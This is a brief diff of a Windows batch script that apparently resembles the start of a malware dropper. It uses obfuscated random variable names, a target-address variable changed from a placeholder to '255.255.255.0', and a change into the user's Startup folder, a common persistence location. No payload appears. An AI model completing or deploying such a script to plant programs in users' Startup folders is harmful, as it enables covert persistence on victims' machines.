@@ -1,5 +1,5 @@
 @echo off
-set "EcSjRhAguo=X.X.X.X"
+set "EcSjRhAguo=255.255.255.0"
 set "XNjFYKECht=%cd%"
 set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %YKHfpmMRoQ%
